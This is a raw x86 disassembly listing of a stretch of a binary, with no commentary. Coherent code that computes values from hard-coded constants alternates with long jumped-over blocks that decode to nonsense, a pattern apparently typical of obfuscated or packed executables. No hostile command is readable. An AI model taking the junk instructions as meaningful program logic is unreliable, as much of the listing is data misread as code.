  41518f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415190:	cmc    
  415191:	mov    al,ds:0x41918bcc
  415196:	cwde   
  415197:	mov    dl,0xf4
  415199:	ret    
  41519a:	shr    BYTE PTR [ebp+0xe],cl
  41519d:	test   DWORD PTR [esi+edx*4-0x4da302c7],edi
  4151a4:	cld    
  4151a5:	pushf  
  4151a6:	icebp  
  4151a7:	inc    edx
  4151a8:	outs   dx,DWORD PTR ds:[esi]
  4151a9:	in     eax,dx
  4151aa:	sbb    al,0xfa
  4151ac:	shl    DWORD PTR [esi+0x2fc7c2a8],cl
  4151b2:	xchg   edx,eax
  4151b3:	stos   BYTE PTR es:[edi],al
  4151b4:	(bad)  
  4151b5:	and    al,0xe6
  4151b7:	lock xchg DWORD PTR [edx+0x36],eax
  4151bb:	imul   esi,DWORD PTR [esi],0x4
  4151be:	add    eax,0xcbe86aae
  4151c3:	push   0x53f0a95
  4151c8:	das    
  4151c9:	iret   
  4151ca:	cmp    DWORD PTR [esi-0x36746d09],ebp
  4151d0:	shl    DWORD PTR [edi],cl
  4151d2:	test   al,0x3b
  4151d4:	mov    edx,DWORD PTR [esp+0x14]
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x597e1b8c]
  415305:	or     bl,BYTE PTR [ecx+0x160ebcbc]
  41530b:	sbb    BYTE PTR [ebp-0x3ee7e7ee],dh
  415311:	adc    ecx,DWORD PTR [edi+ebx*8]
  415314:	mov    esi,DWORD PTR [edx+0x3de434d5]
  41531a:	fwait
  41531b:	pop    ds
  41531c:	daa    
  41531d:	and    dh,BYTE PTR [ebx-0x5b132a6e]
  415323:	cmp    ebp,ebp
  415325:	(bad)  
  415326:	pop    ds
  415327:	retf   0x206c
  41532a:	lds    esp,FWORD PTR [edx-0x298845d1]
  415330:	out    0x6a,eax
  415332:	mov    ecx,0x9688ddb
  415337:	enter  0xa07c,0x85
  41533b:	dec    esp
  41533c:	pop    edx
  41533d:	fadd   QWORD PTR cs:[esi+0x6d]
  415341:	xchg   DWORD PTR [ecx+edi*8+0x31a10278],edi
  415348:	cmp    BYTE PTR [edi-0x58],dh
  41534b:	repnz sbb cl,ch
  41534e:	shl    DWORD PTR [ebx],0xb5
  415351:	xor    DWORD PTR [ecx],esi
  415353:	push   esi
  415354:	stos   BYTE PTR es:[di],al
  415356:	push   cs
  415357:	inc    esi
  415358:	sahf   
  415359:	shl    DWORD PTR [eax],0xc6
  41535c:	pushf  
  41535d:	hlt    
  41535e:	hlt    
  41535f:	jns    0x41537c
  415361:	cmp    ebx,DWORD PTR [ebx]
  415363:	gs js  0x41538d
  415366:	pop    edi
  415367:	dec    esi
  415368:	dec    esi
  415369:	lea    esp,[ebx+0x6c64a146]
  41536f:	(bad)  
  415370:	jge    0x4153cf
  415372:	jmp    DWORD PTR [ebx]
  415374:	out    dx,eax
  415375:	and    DWORD PTR [edi+0x3f],0xbce95674
  41537c:	adc    BYTE PTR [esi],cl
  41537e:	inc    ecx
  41537f:	dec    esp
  415380:	hlt    
  415381:	or     al,0x80
  415383:	xor    BYTE PTR [ecx-0x485379e0],bh
  415389:	mov    eax,DWORD PTR [bx+di+0x2b87]
  41538e:	dec    ebp
  41538f:	in     al,dx
  415390:	or     edx,ebp
  415392:	mov    ebx,DWORD PTR ss:[ebp-0x41a35271]
  415399:	fstp   DWORD PTR [edi-0x23]
  41539c:	mov    ebx,0x82e7098b
  4153a1:	jns    0x4153cc
  4153a3:	leave  
  4153a4:	add    eax,0x7114350f
  4153a9:	sbb    BYTE PTR ds:[edi-0x5c],ah
  4153ad:	pusha  
  4153ae:	daa    
  4153af:	push   es
  4153b0:	sbb    cl,BYTE PTR [esi-0x35]
  4153b3:	mov    dh,0x99
  4153b5:	fs hlt 
  4153b7:	fisub  DWORD PTR [ebp-0x4f30232f]
  4153bd:	fcom   QWORD PTR [esi-0x26]
  4153c0:	mov    DWORD PTR [ebx-0x5a12fe9e],edi
  4153c6:	repz xchg ecx,eax
  4153c8:	mov    esi,0xc9e21713
  4153cd:	dec    esp
  4153ce:	xor    cl,BYTE PTR [edi+0x60]
  4153d1:	in     eax,0xaa
  4153d3:	and    DWORD PTR [edi+0x3c],ecx
  4153d6:	and    DWORD PTR [esi-0x1f],0x5c143e47
  4153dd:	rcl    ah,0x88
  4153e0:	mov    al,0x4e
  4153e2:	pop    edi
  4153e3:	into   
  4153e4:	mov    dh,0x6
  4153e6:	lods   al,BYTE PTR ds:[esi]
  4153e7:	arpl   WORD PTR [edx+0x73114e9c],ax
  4153ed:	div    DWORD PTR [edx-0x6261b132]
  4153f3:	inc    edi
  4153f4:	fs pop esi
  4153f6:	(bad)  
  4153f7:	mov    ebx,DWORD PTR [edx+0x2911e2cf]
  4153fd:	sbb    bl,0x35
  415400:	nop
  415401:	push   ds
  415402:	or     al,0x3d
  415404:	not    DWORD PTR [ebp+0x31]
  415407:	(bad)  
  415408:	adc    esi,eax
  41540a:	lods   eax,DWORD PTR ds:[esi]
  41540b:	push   ebx
  41540c:	data16 int 0x26
  41540f:	shl    BYTE PTR [edi+edi*4-0x11],1
  415413:	xor    ebx,DWORD PTR [edi-0x40255ae7]
  415419:	cmc    
  41541a:	int    0x1c
  41541c:	retf   
  41541d:	cmp    al,0xa5
  41541f:	scas   al,BYTE PTR es:[edi]
  415420:	out    dx,al
  415421:	test   edx,eax
  415423:	push   esp
  415424:	jae    0x4153e7
  415426:	jnp    0x4154a1
  415428:	aaa    
  415429:	outs   dx,DWORD PTR ds:[esi]
  41542a:	jecxz  0x41545a
  41542c:	js     0x415485
  41542e:	cmp    DWORD PTR [esi+eiz*8+0x1],edi
  415432:	sbb    edi,DWORD PTR [eax+eiz*1+0x47]
  415436:	loope  0x4154ad
  415438:	mov    edx,0x4798d5a0
  41543d:	or     DWORD PTR [edi-0x56],esi
  415440:	(bad)  
  415442:	or     ch,BYTE PTR [ebx-0x76]
  415445:	xor    al,0xf8
  415447:	or     ebp,DWORD PTR ss:[ebx]
  41544a:	jmp    0x5b33:0x50aeadb5
  415451:	pop    esp
  415452:	out    0x2d,eax
  415454:	jnp    0x41542d
  415456:	xchg   ecx,eax
  415457:	or     DWORD PTR [ecx],0xffffffdc
  41545a:	fcmovnbe st,st(0)
  41545c:	aaa    
  41545d:	call   0xbcf9:0x9f000d5
  415464:	mov    al,ds:0x136f1e66
  415469:	jbe    0x415470
  41546b:	idiv   edx
  41546d:	mov    ebx,0xde7f7dca
  415472:	popf   
  415473:	dec    esi
  415474:	retf   0x5f3e
  415477:	xor    eax,0xeecb12f3
  41547c:	sbb    bh,bh
  41547e:	xchg   edi,eax
  41547f:	jo     0x41545f
  415481:	repnz push ss
  415483:	inc    eax
  415484:	scas   al,BYTE PTR es:[edi]
  415485:	(bad)  
  415486:	jle    0x415430
  415488:	int    0xe1
  41548a:	jg     0x415495
  41548c:	mov    dh,BYTE PTR [ebp+ebx*1-0xa0b965d]
  415493:	cmp    eax,0xd2f69276
  415498:	xchg   BYTE PTR [ebx],dl
  41549a:	scas   eax,DWORD PTR es:[edi]
  41549b:	jmp    0xab0f1dc4
  4154a0:	data16 jo 0x415510
  4154a3:	xchg   ebp,eax
  4154a4:	data16 das 
  4154a6:	adc    eax,0x797d1ed0
  4154ab:	cmc    
  4154ac:	call   FWORD PTR [edi+0x5b]
  4154af:	ja     0x415528
  4154b1:	sub    dl,BYTE PTR [ebp+0x44a5b4a9]
  4154b7:	cdq    
  4154b8:	mov    DWORD PTR [ecx-0xd],edi
  4154bb:	cmc    
  4154bc:	shl    esi,1
  4154be:	pop    ds
  4154bf:	ss mov esp,0x7364a6c2
  4154c5:	les    esi,FWORD PTR [edi+0x73]
  4154c8:	push   0x32
  4154ca:	aam    0x45
  4154cc:	cmp    DWORD PTR [eax],eax
  4154ce:	popa   
  4154cf:	mov    ebp,0x56d251d5
  4154d4:	fimul  WORD PTR [ebp+eiz*2-0x75]
  4154d8:	sbb    DWORD PTR [eax-0x43f8073e],edx
  4154de:	fild   WORD PTR ds:0xa7efb7f1
  4154e4:	fmul   DWORD PTR [ecx+edi*1+0x19285f74]
  4154eb:	adc    BYTE PTR es:[ebx+edx*2-0x4f],ah
  4154f0:	repz cli 
  4154f2:	mov    eax,ds:0x44b3b1e0
  4154f7:	add    al,0x86
  4154f9:	div    DWORD PTR [ecx]
  4154fb:	jecxz  0x41549e
  4154fd:	sub    eax,DWORD PTR [edx-0x70]
  415500:	jno    0x415513
  415502:	xor    al,0x9
  415504:	mov    esi,0x79acb547
  415509:	jmp    0x341:0x1eea9c2
  415510:	adc    al,BYTE PTR [ebx]
  415512:	loope  0x41555b
  415514:	sbb    BYTE PTR [edx-0x4a],cl
  415517:	jmp    0x8d56:0x4865051d
  41551e:	imul   esp
  415520:	je     0x4154fa
  415522:	(bad)  
  415523:	fiadd  DWORD PTR ds:0xb22c5c33
  415529:	outs   dx,DWORD PTR ds:[esi]
  41552a:	sar    BYTE PTR ds:0x1b122acd,1
  415530:	dec    esi
  415531:	and    al,0xdf
  415533:	loope  0x41556f
  415535:	jecxz  0x4154bf
  415537:	cli    
  415538:	test   al,0x89
  41553a:	or     al,0x36
  41553c:	jmp    0x4154be
  41553e:	push   esp
  41553f:	jmp    0xcf5088ed
  415544:	ss inc ebp
  415546:	shl    BYTE PTR [edi-0x21792ca4],0xe4
  41554d:	inc    ecx
  41554e:	rcl    DWORD PTR [esi-0x7e],0x2
  415552:	push   0xfcc0d83c
  415557:	xor    cl,dh
  415559:	lahf   
  41555a:	cmp    esp,ebp
  41555c:	jl     0x4155a3
  41555e:	push   0xd9e8987d
  415563:	pop    esi
  415564:	xchg   edi,eax
  415565:	sti    
  415566:	xlat   BYTE PTR ds:[ebx]
  415567:	push   ss
  415568:	sub    cl,cl
  41556a:	into   
  41556b:	ret    
  41556c:	cmp    eax,0x293df1df
  415571:	sub    ch,BYTE PTR [ebp+ebp*2-0x19ba5c15]
  415578:	rol    DWORD PTR [ebx],0x8c
  41557b:	enter  0xbb30,0xe3
  41557f:	pusha  
  415580:	sub    esi,DWORD PTR [ebx+0x72]
  415583:	dec    ebp
  415584:	sub    eax,0x729cf35e
  415589:	loopne 0x415604
  41558b:	fst    QWORD PTR [edi-0x67]
  41558e:	leave  
  41558f:	push   esp
  415590:	popa   
  415591:	in     eax,dx
  415592:	pop    eax
  415593:	vpavgw ymm4,ymm4,YMMWORD PTR [ebp-0x2872f78d]
  41559b:	loop   0x41561b
  41559d:	fdiv   st(1),st
  41559f:	push   ebp
  4155a0:	repnz pusha 
  4155a2:	mov    ds:0x9b2837db,eax
  4155a7:	add    DWORD PTR [ecx+0x6],0x58741de4
  4155ae:	lds    edi,FWORD PTR [esi]
  4155b0:	adc    al,bl
  4155b2:	xor    ch,BYTE PTR [ebp-0x44]
  4155b5:	pop    ds
  4155b6:	pop    edx
  4155b7:	sar    BYTE PTR [ebp-0x21],0xed
  4155bb:	adc    edi,edi
  4155bd:	sub    BYTE PTR [esi+0x6ee8937c],ah
  4155c3:	iret   
  4155c4:	ins    BYTE PTR es:[edi],dx
  4155c5:	mov    bh,BYTE PTR [ecx-0x7ad2df5a]
  4155cb:	push   esp
  4155cc:	popf   
  4155cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ce:	ds data16 ins BYTE PTR es:[edi],dx
  4155d1:	xchg   ecx,eax
  4155d2:	(bad)  
  4155d3:	mov    ebp,0x5a6c8dce
  4155d8:	leave  
  4155d9:	or     eax,0xb452594d
  4155de:	jbe    0x4155cd
  4155e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155e1:	loop   0x415625
  4155e3:	mov    esp,0x5c2c0dcd
  4155e8:	icebp  
  4155e9:	mov    ebp,0x1c2b8511
  4155ee:	(bad)  
  4155ef:	sub    cl,ch
  4155f1:	out    0x20,eax
  4155f3:	dec    edx
  4155f4:	mov    al,0x6a
  4155f6:	push   ecx
  4155f7:	gs jns 0x4155ad
  4155fa:	push   esi
  4155fb:	xchg   esi,eax
  4155fc:	dec    BYTE PTR [esi]
  4155fe:	repz push ss
  415600:	pop    ebp
  415601:	adc    edx,DWORD PTR [ebx+ebp*1+0x2926f2eb]
  415608:	sub    al,0x4f
  41560a:	add    ah,BYTE PTR [edi+edi*8-0x37]
  41560e:	out    0x6e,al
  415610:	and    al,0x9d
  415612:	retf   
  415613:	ret    0xcc69
  415616:	sbb    al,0x23
  415618:	push   ss
  415619:	int    0xb7
  41561b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41561c:	or     eax,0x94f6ad9
  415621:	ins    BYTE PTR es:[edi],dx
  415622:	mov    bh,0x93
  415624:	jmp    0x9e47:0xdfb6973d
  41562b:	ret    0xb3df
  41562e:	jnp    0x4155cb
  415630:	push   eax
  415631:	push   0xffffffbe
  415633:	mov    ds:0xc102b70d,al
  415638:	bound  edi,QWORD PTR [ebx]
  41563a:	mov    ebx,0x678ded3b
  41563f:	mov    ds:0x6b3d8334,eax
  415644:	jge    0x4156c3
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x415640
  41567f:	xor    eax,0x858aae7
  415684:	push   ss
  415685:	sbb    BYTE PTR [ebp-0x1ee7e7ee],dh
  41568b:	ins    DWORD PTR es:[edi],dx
  41568c:	push   ebx
  41568d:	sub    DWORD PTR [ebp-0x24],esi
  415690:	mov    es,eax
  415692:	inc    ebx
  415693:	shr    al,0x0
  415696:	mov    bh,BYTE PTR [ebp-0x569364b9]
  41569c:	sub    esp,0xa0c56498
  4156a2:	retf   
  4156a3:	mov    al,BYTE PTR [edx-0x7d]
  4156a6:	mov    al,ds:0xc40547e2
  4156ab:	dec    esi
  4156ac:	clc    
  4156ad:	(bad)  
  4156ae:	cmp    DWORD PTR [eax],esi
  4156b0:	ds popa 
  4156b2:	and    DWORD PTR ds:0xda9614ae,esi
  4156b8:	lea    ebp,[ebx-0x3d]
  4156bb:	out    dx,eax
  4156bc:	inc    esi
  4156bd:	and    bl,dl
  4156bf:	clc    
  4156c0:	add    DWORD PTR [ebx],ebp
  4156c2:	ffree  st(7)
  4156c4:	and    dl,BYTE PTR [ebx]
  4156c6:	pop    edi
  4156c7:	ins    BYTE PTR es:[edi],dx
  4156c8:	popa   
  4156c9:	in     al,dx
  4156ca:	stos   DWORD PTR es:[edi],eax
  4156cb:	cmp    bh,BYTE PTR [eax-0x72e84c59]
  4156d1:	pushf  
  4156d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156d3:	lock std 
  4156d5:	les    edx,FWORD PTR [esi]
  4156d7:	sar    BYTE PTR [eax],0x83
  4156da:	stos   BYTE PTR es:[edi],al
  4156db:	xchg   edi,eax
  4156dc:	and    BYTE PTR [ebx+ebx*4],al
  4156df:	inc    ecx
  4156e0:	mov    ecx,0xeaefacf
  4156e5:	or     ecx,DWORD PTR [ebx-0x4f]
  4156e8:	test   al,0x35
  4156ea:	mov    DWORD PTR [edi],edi
  4156ec:	gs repz inc ecx
  4156ef:	pop    ds
  4156f0:	xor    al,0x1d
  4156f2:	(bad)  
  4156f3:	mov    ebx,0xa0d91f8f
  4156f8:	clc    
  4156f9:	bound  ebx,QWORD PTR [edi-0x410c7688]
  4156ff:	into   
  415700:	retf   0x630f
  415703:	xchg   BYTE PTR [edi+ebp*2-0x26],ch
  415707:	add    al,0xde
  415709:	sbb    edi,DWORD PTR cs:[ebx]
  41570c:	rcl    BYTE PTR [ebx+0x70],1
  41570f:	mov    ds:0x16e11874,al
  415714:	outs   dx,DWORD PTR ds:[esi]
  415715:	inc    eax
  415716:	rcl    ch,1
  415718:	xor    ch,BYTE PTR [eax]
  41571a:	sar    bl,0x12
  41571d:	jle    0x4156a5
  41571f:	sub    BYTE PTR [edi-0x16],dh
  415722:	pop    eax
  415723:	ins    BYTE PTR es:[edi],dx
  415724:	inc    ecx
  415725:	push   eax
  415726:	lock push esp
  415728:	imul   ebx,eax,0xffffffe9
  41572b:	mov    ch,0xf7
  41572d:	mov    ecx,0x306c6d70
  415732:	mov    ds:0xd8cb29c2,eax
  415737:	sub    BYTE PTR ds:0xbec921eb,ch
  41573d:	jae    0x4157bb
  41573f:	fmul   DWORD PTR [edx-0x7cc5a08a]
  415745:	pop    edx
  415746:	aad    0x24
  415748:	call   0x31b3:0x9e9b7c1d
  41574f:	fmul   DWORD PTR [esi+0x4b]
  415752:	outs   dx,BYTE PTR ds:[esi]
  415753:	sar    ah,0xa0
  415756:	pop    esi
  415757:	fidivr WORD PTR [esi+edi*8-0x10]
  41575b:	in     eax,dx
  41575c:	inc    esp
  41575d:	cmp    bh,BYTE PTR [edi+0x68309411]
  415763:	int3   
  415764:	jo     0x4157d6
  415766:	xor    eax,DWORD PTR [edi+0xf8f1d7b]
  41576c:	jne    0x415784
  41576e:	aaa    
  41576f:	push   ebp
  415770:	test   eax,0x106e6a00
  415775:	dec    esi
  415776:	std    
  415777:	fcompp 
  415779:	jmp    0x4157e0
  41577b:	int    0xbc
  41577d:	retf   0xb1e0
  415780:	xor    eax,0xdda4f925
  415785:	stos   BYTE PTR es:[edi],al
  415786:	xchg   esi,eax
  415787:	adc    ebp,DWORD PTR [edx-0x33ad696b]
  41578d:	arpl   bp,bx
  41578f:	es dec edx
  415791:	push   0xffffffd0
  415793:	lods   eax,DWORD PTR ds:[esi]
  415794:	test   al,0x9b
  415796:	jae    0x4157ae
  415798:	inc    esp
  415799:	ins    BYTE PTR es:[edi],dx
  41579a:	mov    al,0xe9
  41579c:	(bad)  
  41579d:	shl    DWORD PTR [ebp-0x7d],cl
  4157a0:	adc    eax,0xb4aca84d
  4157a5:	jecxz  0x415784
  4157a7:	add    al,0xcd
  4157a9:	jp     0x415733
  4157ab:	(bad)  
  4157ac:	jns    0x415771
  4157ae:	add    dh,bl
  4157b0:	push   cs
  4157b1:	jmp    0x41578f
  4157b3:	push   edx
  4157b4:	jno    0x41580b
  4157b6:	loopne 0x415835
  4157b8:	aad    0xb9
  4157ba:	sahf   
  4157bb:	hlt    
  4157bc:	mov    ebp,0x4f9aec92
  4157c1:	sbb    eax,0xc15739dd
  4157c6:	xor    ch,dl
  4157c8:	inc    edx
  4157c9:	aad    0x83
  4157cb:	lock dec eax
  4157cd:	add    eax,DWORD PTR [esi+0x55]
  4157d0:	mov    ebx,0xd27e6473
  4157d5:	jne    0x415828
  4157d7:	jecxz  0x415810
  4157d9:	cld    
  4157da:	retf   0x29c6
  4157dd:	js     0x41583e
  4157df:	mov    ds:0x739eb639,eax
  4157e4:	lahf   
  4157e5:	sti    
  4157e6:	dec    edi
  4157e7:	mov    DWORD PTR [edx-0x3e525336],eax
  4157ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ee:	jg     0x4157ad
  4157f0:	test   esi,ecx
  4157f2:	inc    edi
  4157f3:	hlt    
  4157f4:	addr16 lahf 
  4157f6:	cmp    DWORD PTR [eax+esi*1-0x6c],ebx
  4157fa:	aaa    
  4157fb:	pop    edx
  4157fc:	or     BYTE PTR [ebx-0x29],ah
  4157ff:	push   eax
  415800:	popa   
  415801:	pop    ecx
  415802:	into   
  415803:	or     al,0x26
  415805:	hlt    
  415806:	repnz push eax
  415808:	fist   DWORD PTR [ecx]
  41580a:	mov    edx,0xa57c650e
  41580f:	mov    al,ds:0xf540748e
  415814:	aas    
  415815:	push   ebx
  415816:	inc    esp
  415817:	dec    ebx
  415818:	imul   ebx,DWORD PTR [edx],0xffffffb3
  41581b:	jo     0x415884
  41581d:	call   FWORD PTR [esi+0x6fd520a4]
  415823:	mov    dh,0x67
  415825:	adc    DWORD PTR [ecx-0x54],edi
  415828:	call   0x203a:0x5f2df918
  41582f:	fsubr  st(4),st
  415831:	push   eax
  415832:	(bad)  
  415833:	push   0x3148840c
  415838:	add    esp,DWORD PTR [ecx]
  41583a:	xor    ecx,DWORD PTR [ebp-0x7b]
  41583d:	aas    
  41583e:	outs   dx,BYTE PTR ds:[esi]
  41583f:	cld    
  415840:	xor    edi,DWORD PTR [esi]
  415842:	ror    DWORD PTR [edx+0x643b6c56],0xcd
  415849:	lock repz jp 0x4157f6
  41584d:	pop    ebp
  41584e:	imul   ebp,ecx,0xfa9ef524
  415854:	inc    ebp
  415855:	loope  0x4158a5
  415857:	aaa    
  415858:	imul   eax
  41585a:	xor    eax,0xbf434fd9
  41585f:	retf   
  415860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415861:	sub    DWORD PTR [ebp-0x736ef076],esi
  415867:	xlat   BYTE PTR ds:[ebx]
  415868:	push   edi
  415869:	imul   ebx,edi,0x78
  41586c:	jp     0x415855
  41586e:	mov    DWORD PTR [esi],0xdfee3bd8
  415874:	neg    DWORD PTR [edi-0x22]
  415877:	js     0x41580e
  415879:	leave  
  41587a:	lods   eax,DWORD PTR ds:[esi]
  41587b:	push   ebx
  41587c:	into   
  41587d:	and    DWORD PTR [edi+0x35],eax
  415880:	mov    cl,BYTE PTR ds:0x6b7b2739
  415886:	jb     0x4158b2
  415888:	cwde   
  415889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41588a:	pop    ss
  41588b:	mov    eax,0xf14e409b
  415890:	xor    al,0x40
  415892:	arpl   WORD PTR [eax+0x57],ax
  415895:	pop    ebp
  415896:	movmskps ecx,xmm1
  415899:	sbb    esi,DWORD PTR ds:0x3564acdd
  41589f:	outs   dx,BYTE PTR ds:[esi]
  4158a0:	pop    eax
  4158a1:	sar    DWORD PTR [esi-0x519f495d],cl
  4158a7:	mov    ecx,DWORD PTR [ecx]
  4158a9:	mov    BYTE PTR [eax],bl
  4158ab:	xor    esp,esi
  4158ad:	and    DWORD PTR [edi+eax*2],edx
  4158b0:	dec    eax
  4158b1:	mov    ah,BYTE PTR [esi+0x38]
  4158b4:	lahf   
  4158b5:	je     0x4158bc
  4158b7:	jb     0x4158df
  4158b9:	lods   eax,DWORD PTR ds:[esi]
  4158bb:	mov    bh,0x12
  4158bd:	ins    BYTE PTR es:[edi],dx
  4158be:	into   
  4158bf:	push   ebp
  4158c0:	pop    eax
  4158c1:	out    0xf2,al
  4158c3:	call   0x2a79:0xcf5ab707
  4158ca:	call   0xd975:0x1efe2fe6
  4158d1:	mov    ds:0xaf368358,eax
  4158d6:	jmp    0x799c:0x2c020878
  4158dd:	jmp    0xdbc:0xdc1eda7d
  4158e4:	pop    ss
  4158e5:	and    al,0xbc
  4158e7:	pop    es
  4158e8:	push   ds
  4158e9:	adc    al,0x2f
  4158eb:	call   0x9ccd:0xa7b042b0
  4158f2:	call   0x75e7:0xc363f91b
  4158f9:	inc    esp
  4158fa:	xchg   esi,eax
  4158fb:	mov    edi,0xd37ef932
  415900:	sbb    eax,0x7b906718
  415905:	dec    cl
  415907:	inc    esi
  415908:	out    dx,eax
  415909:	xchg   DWORD PTR [edi-0x4d],esp
  41590c:	or     esp,DWORD PTR [esi+edi*8]
  41590f:	mov    WORD PTR [ecx-0x40e92bc3],ss
  415915:	mov    al,0x40
  415917:	stos   BYTE PTR es:[edi],al
  415918:	cmc    
  415919:	adc    al,0xb4
  41591b:	mul    DWORD PTR [ecx-0x2f]
  41591e:	jns    0x415921
  415920:	test   DWORD PTR [eax-0x1bc2d798],0x25e50812
  41592a:	adc    DWORD PTR [esi-0x4ac3e9f6],esp
  415930:	in     eax,0x65
  415932:	sub    eax,0x97eb4b56
  415937:	mov    WORD PTR [ecx-0x713fe741],gs
  41593d:	mov    bl,0xe9
  41593f:	mov    esi,0x9da96b7d
  415944:	in     eax,dx
  415945:	repnz test BYTE PTR [eax-0x35],dh
  415949:	mov    dl,0x74
  41594b:	sar    DWORD PTR [edi+0x7d],1
  41594e:	imul   eax,ebp,0x931fd7c0
  415954:	push   0xb4372914
  415959:	or     bh,BYTE PTR [esi-0x45b88f36]
  41595f:	call   0x7e6c7024
  415964:	iret   
  415965:	jno    0x4159bb
  415967:	test   BYTE PTR [edi-0x6c],ah
  41596a:	les    eax,FWORD PTR ds:0xd7efc792
  415970:	adc    al,0x1f
  415972:	jnp    0x41593d
  415974:	add    eax,0x3f564109
  415979:	(bad)  
  41597b:	inc    BYTE PTR [edi]
  41597d:	lods   eax,DWORD PTR ds:[esi]
  41597e:	fidiv  DWORD PTR [ebx-0x28]
  415981:	xchg   edi,eax
  415982:	mov    bh,0x10
  415984:	mov    eax,0x63492097
  415989:	sbb    eax,edx
  41598b:	data16 (bad) [eax-0x5f7a2c0e]
  415992:	mov    al,bh
  415994:	jge    0x41593a
  415996:	clc    
  415997:	lahf   
  415998:	push   0xffffffcc
  41599a:	iret   
  41599b:	add    eax,0xea37c382
  4159a0:	push   ds
  4159a1:	pusha  
  4159a2:	xchg   edx,eax
  4159a3:	(bad)  
  4159a4:	jo     0x415988
  4159a6:	jmp    0x41593c
  4159a8:	mov    eax,ds:0xd6e927f7
  4159ad:	add    BYTE PTR [eax+ebp*1-0x34cf3f36],ah
  4159b4:	mov    ch,0xb4
  4159b6:	jge    0x415a27
  4159b8:	gs add eax,0x1977ac9b
  4159be:	loop   0x415966
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
